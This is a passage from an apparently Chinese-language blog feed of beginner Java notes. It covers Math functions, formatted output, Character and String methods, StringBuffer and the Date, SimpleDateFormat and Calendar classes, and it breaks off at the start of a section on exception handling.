Math.random()*<span class="number">10</span>));</span><br><span class="line">        <span class="comment">//开方</span></span><br><span class="line">        System.out.println(Math.sqrt(<span class="number">9</span>));</span><br><span class="line">        <span class="comment">//次方（2的4次方）</span></span><br><span class="line">        System.out.println(Math.pow(<span class="number">2</span>,<span class="number">4</span>));</span><br><span class="line">         </span><br><span class="line">        <span class="comment">//π</span></span><br><span class="line">        System.out.println(Math.PI);</span><br><span class="line">         </span><br><span class="line">        <span class="comment">//自然常数</span></span><br><span class="line">        System.out.println(Math.E);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="格式化">格式化</h4><p>%s 表示字符串<br>%d 表示数字<br>%n 表示换行</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> digit;</span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestNumber</span> &#123;</span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"> </span><br><span class="line">        <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span><span class="string">&quot;盖伦&quot;</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">kill</span> <span class="operator">=</span> <span class="number">8</span>;</span><br><span class="line">        String title=<span class="string">&quot;超神&quot;</span>;</span><br><span class="line">         </span><br><span class="line">        <span class="comment">//直接使用+进行字符串连接，编码感觉会比较繁琐，并且维护性差,易读性差</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">sentence</span> <span class="operator">=</span> name+ <span class="string">&quot; 在进行了连续 &quot;</span> + kill + <span class="string">&quot; 次击杀后，获得了 &quot;</span> + title +<span class="string">&quot; 的称号&quot;</span>;</span><br><span class="line">         </span><br><span class="line">        System.out.println(sentence);</span><br><span class="line">         </span><br><span class="line">        <span class="comment">//使用格式化输出</span></span><br><span class="line">        <span class="comment">//%s表示字符串，%d表示数字,%n表示换行</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">sentenceFormat</span> <span class="operator">=</span><span class="string">&quot;%s 在进行了连续 %d 次击杀后，获得了 %s 的称号%n&quot;</span>;</span><br><span class="line">        System.out.printf(sentenceFormat,name,kill,title);</span><br><span class="line">         </span><br><span class="line"></span><br></pre></td></tr></table></figure><p>printf</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> digit;</span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestNumber</span> &#123;</span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"> </span><br><span class="line">        <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span><span class="string">&quot;盖伦&quot;</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">kill</span> <span class="operator">=</span> <span class="number">8</span>;</span><br><span class="line">        String title=<span class="string">&quot;超神&quot;</span>;</span><br><span class="line">         </span><br><span class="line">        <span class="type">String</span> <span class="variable">sentenceFormat</span> <span class="operator">=</span><span class="string">&quot;%s 在进行了连续 %d 次击杀后，获得了 %s 的称号%n&quot;</span>;</span><br><span class="line">        <span class="comment">//使用printf格式化输出</span></span><br><span class="line">        System.out.printf(sentenceFormat,name,kill,title);</span><br><span class="line">        <span class="comment">//使用format格式化输出</span></span><br><span class="line">        System.out.format(sentenceFormat,name,kill,title);</span><br><span class="line">         </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>换行符</strong>就是另起一行 — ‘\n’ 换行（newline）<br><strong>回车符</strong>就是回到一行的开头 — ‘\r’ 回车（return）<br>在eclipse里敲一个回车，实际上是<strong>回车换行符</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> digit;</span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> java.util.Locale;</span><br><span class="line">   </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestNumber</span> &#123;</span><br><span class="line">   </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">year</span> <span class="operator">=</span> <span class="number">2020</span>;</span><br><span class="line">        <span class="comment">//总长度，左对齐，补0，千位分隔符，小数点位数，本地化表达</span></span><br><span class="line">          </span><br><span class="line">        <span class="comment">//直接打印数字</span></span><br><span class="line">        System.out.format(<span class="string">&quot;%d%n&quot;</span>,year);</span><br><span class="line">        <span class="comment">//总长度是8,默认右对齐</span></span><br><span class="line">        System.out.format(<span class="string">&quot;%8d%n&quot;</span>,year);</span><br><span class="line">        <span class="comment">//总长度是8,左对齐</span></span><br><span class="line">        System.out.format(<span class="string">&quot;%-8d%n&quot;</span>,year);</span><br><span class="line">        <span class="comment">//总长度是8,不够补0</span></span><br><span class="line">        System.out.format(<span class="string">&quot;%08d%n&quot;</span>,year);</span><br><span class="line">        <span class="comment">//千位分隔符</span></span><br><span class="line">        System.out.format(<span class="string">&quot;%,8d%n&quot;</span>,year*<span class="number">10000</span>);</span><br><span class="line">  </span><br><span class="line">        <span class="comment">//小数点位数</span></span><br><span class="line">        System.out.format(<span class="string">&quot;%.2f%n&quot;</span>,Math.PI);</span><br><span class="line">          </span><br><span class="line">        <span class="comment">//不同国家的千位分隔符</span></span><br><span class="line">        System.out.format(Locale.FRANCE,<span class="string">&quot;%,.2f%n&quot;</span>,Math.PI*<span class="number">10000</span>);</span><br><span class="line">        System.out.format(Locale.US,<span class="string">&quot;%,.2f%n&quot;</span>,Math.PI*<span class="number">10000</span>);</span><br><span class="line">        System.out.format(Locale.UK,<span class="string">&quot;%,.2f%n&quot;</span>,Math.PI*<span class="number">10000</span>);</span><br><span class="line">          </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">     </span><br></pre></td></tr></table></figure><h5 id="字符">字符:</h5><p>保存一个字符的时候使用char</p><p>char对应的封装类是Character</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> character;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestChar</span> &#123;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">         </span><br><span class="line">        System.out.println(Character.isLetter(<span class="string">&#x27;a&#x27;</span>));<span class="comment">//判断是否为字母</span></span><br><span class="line">        System.out.println(Character.isDigit(<span class="string">&#x27;a&#x27;</span>)); <span class="comment">//判断是否为数字</span></span><br><span class="line">        System.out.println(Character.isWhitespace(<span class="string">&#x27; &#x27;</span>)); <span class="comment">//是否是空白</span></span><br><span class="line">        System.out.println(Character.isUpperCase(<span class="string">&#x27;a&#x27;</span>)); <span class="comment">//是否是大写</span></span><br><span class="line">        System.out.println(Character.isLowerCase(<span class="string">&#x27;a&#x27;</span>)); <span class="comment">//是否是小写</span></span><br><span class="line">         </span><br><span class="line">        System.out.println(Character.toUpperCase(<span class="string">&#x27;a&#x27;</span>)); <span class="comment">//转换为大写</span></span><br><span class="line">        System.out.println(Character.toLowerCase(<span class="string">&#x27;A&#x27;</span>)); <span class="comment">//转换为小写</span></span><br><span class="line"> </span><br><span class="line">        <span class="type">String</span> <span class="variable">a</span> <span class="operator">=</span> <span class="string">&#x27;a&#x27;</span>; <span class="comment">//不能够直接把一个字符转换成字符串</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">a2</span> <span class="operator">=</span> Character.toString(<span class="string">&#x27;a&#x27;</span>); <span class="comment">//转换为字符串</span></span><br><span class="line">         </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>length方法返回当前字符串的长度</p><table><thead><tr><th></th><th></th><th></th></tr></thead><tbody><tr><td>charAt</td><td>获取字符</td><td><a href="https://how2j.cn/k/number-string/number-string-manipulate/325.html#step712">示例代码</a></td></tr><tr><td>toCharArray</td><td>获取对应的字符数组</td><td><a href="https://how2j.cn/k/number-string/number-string-manipulate/325.html#step719">示例代码</a></td></tr><tr><td>subString</td><td>截取子字符串</td><td><a href="https://how2j.cn/k/number-string/number-string-manipulate/325.html#step713">示例代码</a></td></tr><tr><td>split</td><td>分隔</td><td><a href="https://how2j.cn/k/number-string/number-string-manipulate/325.html#step714">示例代码</a></td></tr><tr><td>trim</td><td>去掉首尾空格</td><td><a href="https://how2j.cn/k/number-string/number-string-manipulate/325.html#step715">示例代码</a></td></tr><tr><td>toLowerCase toUpperCase</td><td>大小写</td><td><a href="https://how2j.cn/k/number-string/number-string-manipulate/325.html#step716">示例代码</a></td></tr><tr><td>indexOf lastIndexOf contains</td><td>定位</td><td><a href="https://how2j.cn/k/number-string/number-string-manipulate/325.html#step717">示例代码</a></td></tr><tr><td>replaceAll replaceFirst</td><td></td><td></td></tr></tbody></table><p>使用equals进行字符串内容的比较，必须大小写一致<br>equalsIgnoreCase，忽略大小写判断内容是否一致</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> character;</span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestString</span> &#123;</span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">str1</span> <span class="operator">=</span> <span class="string">&quot;the light&quot;</span>;</span><br><span class="line">         </span><br><span class="line">        <span class="type">String</span> <span class="variable">start</span> <span class="operator">=</span> <span class="string">&quot;the&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">end</span> <span class="operator">=</span> <span class="string">&quot;Ight&quot;</span>;</span><br><span class="line">         </span><br><span class="line">        System.out.println(str1.startsWith(start));<span class="comment">//以...开始</span></span><br><span class="line">        System.out.println(str1.endsWith(end));<span class="comment">//以...结束</span></span><br><span class="line">          </span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> character;</span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestString</span> &#123;</span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">str1</span> <span class="operator">=</span> <span class="string">&quot;let there &quot;</span>;</span><br><span class="line"> </span><br><span class="line">        <span class="type">StringBuffer</span> <span class="variable">sb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuffer</span>(str1); <span class="comment">//根据str1创建一个StringBuffer对象</span></span><br><span class="line">        sb.append(<span class="string">&quot;be light&quot;</span>); <span class="comment">//在最后追加</span></span><br><span class="line">         </span><br><span class="line">        System.out.println(sb);</span><br><span class="line">         </span><br><span class="line">        sb.delete(<span class="number">4</span>, <span class="number">10</span>);<span class="comment">//删除4-10之间的字符</span></span><br><span class="line">         </span><br><span class="line">        System.out.println(sb);</span><br><span class="line">         </span><br><span class="line">        sb.insert(<span class="number">4</span>, <span class="string">&quot;there &quot;</span>);<span class="comment">//在4这个位置插入 there</span></span><br><span class="line">         </span><br><span class="line">        System.out.println(sb);</span><br><span class="line">         </span><br><span class="line">        sb.reverse(); <span class="comment">//反转</span></span><br><span class="line">         </span><br><span class="line">        System.out.println(sb);</span><br><span class="line"> </span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="时间日历">时间日历</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> date;</span><br><span class="line"> </span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="keyword">import</span> java.util.Date;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestDate</span> &#123;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"> </span><br><span class="line">        <span class="comment">// 当前时间</span></span><br><span class="line">        <span class="type">Date</span> <span class="variable">d1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Date</span>();</span><br><span class="line">        System.out.println(<span class="string">&quot;当前时间:&quot;</span>);</span><br><span class="line">        System.out.println(d1);</span><br><span class="line">        System.out.println();</span><br><span class="line">        <span class="comment">// 从1970年1月1日 早上8点0分0秒 开始经历的毫秒数</span></span><br><span class="line">        <span class="type">Date</span> <span class="variable">d2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Date</span>(<span class="number">5000</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;从1970年1月1日 早上8点0分0秒 开始经历了5秒的时间&quot;</span>);</span><br><span class="line">        System.out.println(d2);</span><br><span class="line"> </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> date;</span><br><span class="line">  </span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="keyword">import</span> java.util.Date;</span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestDate</span> &#123;</span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">//注意：是java.util.Date;</span></span><br><span class="line">        <span class="comment">//而非 java.sql.Date，此类是给数据库访问的时候使用的</span></span><br><span class="line">        Date now= <span class="keyword">new</span> <span class="title class_">Date</span>();</span><br><span class="line">        <span class="comment">//打印当前时间</span></span><br><span class="line">        System.out.println(<span class="string">&quot;当前时间:&quot;</span>+now.toString());</span><br><span class="line">        <span class="comment">//getTime() 得到一个long型的整数</span></span><br><span class="line">        <span class="comment">//这个整数代表 1970.1.1 08:00:00:000，每经历一毫秒，增加1</span></span><br><span class="line">        System.out.println(<span class="string">&quot;当前时间getTime()返回的值是：&quot;</span>+now.getTime());</span><br><span class="line">          </span><br><span class="line">        <span class="type">Date</span> <span class="variable">zero</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Date</span>(<span class="number">0</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;用0作为构造方法，得到的日期是:&quot;</span>+zero);</span><br><span class="line">          </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">System.out.println(&quot;System.currentTimeMillis() \t返回值: &quot;+System.currentTimeMillis());</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span>` `date;</span><br><span class="line"> </span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="keyword">import</span>` `java.text.SimpleDateFormat;</span><br><span class="line"><span class="keyword">import</span>` `java.util.Date;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span>` `class` `TestDate &#123;</span><br><span class="line"> </span><br><span class="line">  ``<span class="keyword">public</span>` `<span class="keyword">static</span>` `<span class="keyword">void</span>` `main(String[] args) &#123;</span><br><span class="line">     </span><br><span class="line">    ``<span class="comment">//y 代表年</span></span><br><span class="line">    ``<span class="comment">//M 代表月</span></span><br><span class="line">    ``<span class="comment">//d 代表日</span></span><br><span class="line">    ``<span class="comment">//H 代表24进制的小时</span></span><br><span class="line">    ``<span class="comment">//h 代表12进制的小时</span></span><br><span class="line">    ``<span class="comment">//m 代表分钟</span></span><br><span class="line">    ``<span class="comment">//s 代表秒</span></span><br><span class="line">    ``<span class="comment">//S 代表毫秒</span></span><br><span class="line">    ``<span class="type">SimpleDateFormat</span> <span class="variable">sdf</span> <span class="operator">=</span>``<span class="keyword">new</span>` `SimpleDateFormat(``<span class="string">&quot;yyyy-MM-dd HH:mm:ss SSS&quot;</span>` `);</span><br><span class="line">    ``Date d= ``<span class="keyword">new</span>` `Date();</span><br><span class="line">    ``<span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> sdf.format(d);</span><br><span class="line">    ``System.out.println(``<span class="string">&quot;当前时间通过 yyyy-MM-dd HH:mm:ss SSS 格式化后的输出: &quot;</span>``+str);</span><br><span class="line">    </span><br><span class="line">    ``<span class="type">SimpleDateFormat</span> <span class="variable">sdf1</span> <span class="operator">=</span>``<span class="keyword">new</span>` `SimpleDateFormat(``<span class="string">&quot;yyyy-MM-dd&quot;</span>` `);</span><br><span class="line">    ``Date d1= ``<span class="keyword">new</span>` `Date();</span><br><span class="line">    ``<span class="type">String</span> <span class="variable">str1</span> <span class="operator">=</span> sdf1.format(d1);</span><br><span class="line">    ``System.out.println(``<span class="string">&quot;当前时间通过 yyyy-MM-dd 格式化后的输出: &quot;</span>``+str1);</span><br><span class="line">    </span><br><span class="line">  ``&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> date;</span><br><span class="line">  </span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="keyword">import</span> java.util.Calendar;</span><br><span class="line"><span class="keyword">import</span> java.util.Date;</span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestDate</span> &#123;</span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">//采用单例模式获取日历对象Calendar.getInstance();</span></span><br><span class="line">        <span class="type">Calendar</span> <span class="variable">c</span> <span class="operator">=</span> Calendar.getInstance();</span><br><span class="line">          </span><br><span class="line">        <span class="comment">//通过日历对象得到日期对象</span></span><br><span class="line">        <span class="type">Date</span> <span class="variable">d</span> <span class="operator">=</span> c.getTime();</span><br><span class="line">  </span><br><span class="line">        <span class="type">Date</span> <span class="variable">d2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Date</span>(<span class="number">0</span>);</span><br><span class="line">        c.setTime(d2); <span class="comment">//把这个日历，调成日期 : 1970.1.1 08:00:00</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> date;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> java.text.SimpleDateFormat;</span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="keyword">import</span> java.util.Calendar;</span><br><span class="line"><span class="keyword">import</span> java.util.Date;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestDate</span> &#123;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">SimpleDateFormat</span> <span class="variable">sdf</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SimpleDateFormat</span>(<span class="string">&quot;yyyy-MM-dd HH:mm:ss&quot;</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Calendar</span> <span class="variable">c</span> <span class="operator">=</span> Calendar.getInstance();</span><br><span class="line">        <span class="type">Date</span> <span class="variable">now</span> <span class="operator">=</span> c.getTime();</span><br><span class="line">        <span class="comment">// 当前日期</span></span><br><span class="line">        System.out.println(<span class="string">&quot;当前日期：\t&quot;</span> + format(c.getTime()));</span><br><span class="line"> </span><br><span class="line">        <span class="comment">// 下个月的今天</span></span><br><span class="line">        c.setTime(now);</span><br><span class="line">        c.add(Calendar.MONTH, <span class="number">1</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;下个月的今天:\t&quot;</span> +format(c.getTime()));</span><br><span class="line"> </span><br><span class="line">        <span class="comment">// 去年的今天</span></span><br><span class="line">        c.setTime(now);</span><br><span class="line">        c.add(Calendar.YEAR, -<span class="number">1</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;去年的今天:\t&quot;</span> +format(c.getTime()));</span><br><span class="line"> </span><br><span class="line">        <span class="comment">// 上个月的第三天</span></span><br><span class="line">        c.setTime(now);</span><br><span class="line">        c.add(Calendar.MONTH, -<span class="number">1</span>);</span><br><span class="line">        c.set(Calendar.DATE, <span class="number">3</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;上个月的第三天:\t&quot;</span> +format(c.getTime()));</span><br><span class="line"> </span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> String <span class="title function_">format</span><span class="params">(Date time)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> sdf.format(time);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java学习基础（2）</title>
      <link href="/2024/04/23/java2/"/>
      <url>/2024/04/23/java2/</url>
      
        <content type="html"><![CDATA[<h1>java中级</h1><h2 id="异常处理">异常处理</h2><p>导致程序的正常流程被中断的事件，叫做异常</p><p>常见手段： try catch  finally  throws</p><h3 id="try-catch">try catch</h3><p>将可能抛出FileNotFoundException <strong>文件不存在异常</strong>的代码放在try里<br>2.如果文件存在，就会顺序往下执行，并且不执行catch块中的代码<br>\3. 如果文件不存在，try 里的代码会立即终止，程序流程会运行到对应的catch块中<br>\4. e.printStackTrace(); 会打印出方法的调用痕迹，如此例，会打印出异常开始于TestException的第16行，这样就便于定位和分析到底哪里出了异常</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> exception;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileNotFoundException;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestException</span> &#123;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">         </span><br><span class="line">        File f= <span 